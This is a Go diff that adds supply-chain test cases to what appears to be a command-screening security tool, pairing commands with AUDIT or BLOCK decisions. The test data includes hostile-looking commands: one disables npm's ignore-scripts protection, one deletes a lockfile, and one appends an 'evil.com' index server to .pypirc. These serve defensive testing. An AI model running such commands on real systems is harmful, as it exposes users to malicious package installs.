@@ -158,9 +158,138 @@ var NonStandardRegistryCases = []TestCase{
 	},
 }
 
+// PackageInstallCases tests audit-level standard package manager commands
+// and block-level security control bypasses.
+// Taxonomy: supply-chain/package-install/*
+var PackageInstallCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	{
+		ID:               "TP-PKGINST-001",
+		Command:          `yarn add lodash`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `yarn add package. Matches sc-audit-yarn-add prefix rule.`,
+		Tags:             []string{"canonical", "package-manager"},
+	},
+	{
+		ID:               "TP-PKGINST-002",
+		Command:          `brew install wget`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `Homebrew package install. Matches sc-audit-brew-install prefix rule.`,
+		Tags:             []string{"canonical", "package-manager"},
+	},
+	{
+		ID:               "TP-PKGINST-003",
+		Command:          `cargo install ripgrep`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `Cargo package install. Matches sc-audit-cargo-install prefix rule.`,
+		Tags:             []string{"canonical", "package-manager"},
+	},
+	{
+		ID:               "TP-PKGINST-004",
+		Command:          `gem install bundler`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `Ruby gem install. Matches sc-audit-gem-install prefix rule.`,
+		Tags:             []string{"canonical", "package-manager"},
+	},
+	{
+		ID:               "TP-PKGINST-005",
+		Command:          `npm install -g typescript`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/global-package-install",
+		Analyzer:         "regex",
+		Description:      `Global npm install (-g flag). Matches sc-audit-global-install regex.`,
+		Tags:             []string{"canonical", "global-install"},
+	},
+	{
+		ID:               "TP-PKGINST-006",
+		Command:          `npm config set ignore-scripts false`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/security-control-bypass",
+		Analyzer:         "regex",
+		Description:      `Disabling npm script sandbox. Matches sc-block-npm-ignore-scripts-off regex.`,
+		Tags:             []string{"canonical", "critical", "security-bypass"},
+	},
+	{
+		ID:               "TP-PKGINST-007",
+		Command:          `rm package-lock.json`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/package-install/security-control-bypass",
+		Analyzer:         "regex",
+		Description:      `Deleting lockfile removes integrity guarantees. Matches sc-audit-lockfile-edit regex.`,
+		Tags:             []string{"canonical", "lockfile"},
+	},
+	{
+		ID:               "TP-PKGINST-008",
+		Command:          `echo "index-server=https://evil.com" >> .pypirc`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/config-tampering/package-config-edit",
+		Analyzer:         "regex",
+		Description:      `Writing to .pypirc to redirect pip installs. Matches sc-block-pypirc-edit regex.`,
+		Tags:             []string{"canonical", "critical"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	{
+		ID:               "TN-PKGINST-001",
+		Command:          `yarn list`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `yarn list is a read-only query, not a package installation. sc-audit-yarn-add
+			does NOT fire (prefix "yarn add" doesn't match "yarn list"). Semantic engine gives
+			AUDIT for yarn. TN for the specific install rule.`,
+		Tags:             []string{"common-dev-operation"},
+	},
+	{
+		ID:               "TN-PKGINST-002",
+		Command:          `cargo build`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/package-install/standard-package-install",
+		Analyzer:         "regex",
+		Description:      `cargo build compiles code, does not install new packages. sc-audit-cargo-install
+			does NOT fire (prefix "cargo install"/"cargo add" doesn't match "cargo build").
+			Semantic engine gives AUDIT for cargo. TN for the specific install rule.`,
+		Tags:             []string{"common-dev-operation"},
+	},
+	{
+		ID:               "TN-PKGINST-003",
+		Command:          `npm config get ignore-scripts`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/package-install/security-control-bypass",
+		Analyzer:         "regex",
+		Description:      `Reading the ignore-scripts setting (get, not set) is benign. sc-block-npm-ignore-scripts-off
+			does NOT fire (requires "set false", not "get"). Semantic engine gives AUDIT for npm.
+			TN for the specific BLOCK rule.`,
+		Tags:             []string{"common-dev-operation"},
+	},
+}
+
 // AllSupplyChainCases returns all test cases for Kingdom 7.
 func AllSupplyChainCases() []TestCase {
 	var all []TestCase
 	all = append(all, NonStandardRegistryCases...)
+	all = append(all, PackageInstallCases...)
 	return all
 }
